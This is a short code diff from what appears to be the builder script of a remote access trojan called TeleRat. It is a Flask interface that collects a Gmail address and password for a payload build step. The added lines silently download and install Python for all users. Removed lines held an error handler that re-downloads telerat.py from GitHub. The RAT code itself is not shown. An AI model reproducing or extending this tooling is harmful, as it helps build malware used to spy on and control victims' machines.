@@ -1,4 +1,19 @@
-import os,wget
+import os
+
+os.system('python --version >> temp.txt')
+check = open('temp.txt','r').read()
+
+if 'Python' in check:
+    pass
+else:
+    os.system('curl -s https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe --output python.exe')
+    os.system('python.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 SimpleInstall=1')
+    os.remove('python.exe')
+    os.system('pip install -r Source_Files/requirements.txt')
+os.remove('temp.txt')
+
+
+
 from shutil import copyfile
 from flaskwebgui import FlaskUI
 from flask import Flask, render_template, request
@@ -14,14 +29,6 @@ def output():
     start(request.form['gmail'],request.form['password'])
     return render_template("Built.html")
 
-@app.errorhandler(500)
-def internal_error(error):
-    os.remove('Source_Files\telerat.py')
-    wget.download('https://raw.githubusercontent.com/navin-hariharan/TeleRat/main/Source_Files/telerat.py','Source_Files\telerat.py')
-
-@app.errorhandler(404)
-def not_found(error):
-    return render_template("Build.html")
 
 def start(gmail,password):
         with open('Source_Files/smile_please.py', 'r') as file :
